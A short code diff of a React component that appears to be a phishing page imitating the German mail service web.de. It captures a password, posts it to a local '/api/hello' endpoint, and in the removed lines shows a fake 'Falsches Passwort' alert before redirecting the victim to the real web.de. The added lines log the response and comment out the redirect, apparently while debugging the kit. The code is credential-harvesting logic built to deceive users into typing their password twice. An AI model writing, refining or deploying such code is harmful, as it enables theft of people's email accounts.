@@ -74,16 +74,15 @@ export default function Main() {
       password: credentials.passwort,
     };
     if (count === 1) {
-      window.location.href = "https://web.de";
       return;
     }
     axios
       .post("/api/hello", data)
       .then((req) => {
         setCredentials({ ...credentials, passwort: "" });
-        window.alert("Falsches Passwort");
+        console.log(req);
 
-        setCount((prev) => prev + 1);
+        // window.location.href = "https://web.de";
       })
       .catch((err) => {
         console.log(err);
